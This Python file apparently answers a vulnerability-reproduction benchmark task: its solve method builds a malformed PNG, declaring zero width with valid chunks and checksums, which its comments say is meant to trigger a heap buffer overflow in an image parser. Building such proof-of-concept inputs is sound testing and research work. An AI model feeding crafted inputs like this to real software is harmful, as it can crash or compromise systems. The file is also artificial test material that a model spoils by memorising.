import os
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG with zero width that should trigger heap buffer overflow
        # Based on typical PNG structure with minimal valid chunks
        
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk - zero width (0), non-zero height (1)
        # Width: 0, Height: 1, Bit depth: 8, Color type: 6 (RGBA), 
        # Compression: 0, Filter: 0, Interlace: 0
        ihdr_data = struct.pack('>IIBBBBB', 0, 1, 8, 6, 0, 0, 0)
        ihdr_chunk = self._make_chunk(b'IHDR', ihdr_data)
        
        # IDAT chunk - minimal valid compressed data for 1x0 image
        # For RGBA (4 bytes per pixel), with filter type 0 per scanline
        # 0 pixels = empty compressed data
        idat_data = zlib.compress(b'')
        idat_chunk = self._make_chunk(b'IDAT', idat_data)
        
        # IEND chunk
        iend_chunk = self._make_chunk(b'IEND', b'')
        
        # Combine all chunks
        poc = png_signature + ihdr_chunk + idat_chunk + iend_chunk
        
        return poc
    
    def _make_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        """Create a PNG chunk with proper length and CRC."""
        length = len(data)
        crc = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
        return struct.pack('>I', length) + chunk_type + data + struct.pack('>I', crc)